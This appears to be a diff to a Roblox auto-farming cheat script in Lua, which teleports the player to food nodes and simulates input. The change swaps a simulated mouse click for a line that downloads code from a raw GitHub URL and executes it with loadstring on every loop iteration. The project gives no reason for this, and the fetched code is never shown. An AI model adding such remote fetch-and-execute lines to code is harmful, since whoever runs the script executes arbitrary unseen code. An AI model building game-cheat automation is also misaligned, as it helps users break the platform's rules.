@@ -178,9 +178,8 @@ teleportCoroutine = coroutine.create(function()
     while isFarming do
         teleportToFoodNode() -- Телепортируем игрока
         local VirtualInputManager = game:GetService('VirtualInputManager')
-        VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 1) -- Нажатие
-        task.wait(0.8) -- Короткая задержка
-        VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 1) -- Отпускание
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Gusha312/scriptkwqf3124/refs/heads/main/cos"))()
+        task.wait(2)
         VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game)
         task.wait(0.1)
         VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.F, false, game)
